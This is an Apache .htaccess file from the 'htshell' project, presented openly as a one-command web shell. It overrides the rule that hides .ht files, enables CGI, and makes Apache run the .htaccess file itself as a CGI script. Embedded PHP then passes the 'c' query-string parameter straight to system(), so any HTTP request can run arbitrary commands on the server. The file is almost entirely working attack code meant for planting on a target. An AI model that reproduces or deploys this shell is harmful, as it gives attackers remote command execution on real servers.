#!C:\php\bin\php.exe
#<?php echo "Content-Tpe: text/html\r\n\r\n"; ?>
# Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com
# This attack is a one command attack and usually only viable on windows due to linux requiring the execute bit set for cgi's

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
# Uncomment the line below for Apache2.4 and newer
# Require all granted
    Order allow,deny
    Allow from all
</Files>

# Enable  CGI
Options +ExecCGI

#Make apache treat .htaccess as a cgi file
AddHandler cgi-script .htaccess

###### SHELL ###### <?php echo "h\n";preg_match('/c=(.*)$/',urldecode($_ENV['QUERY_STRING']), $cmd);system($cmd[1]." 2>&1"); ?>###### LLEHS ######
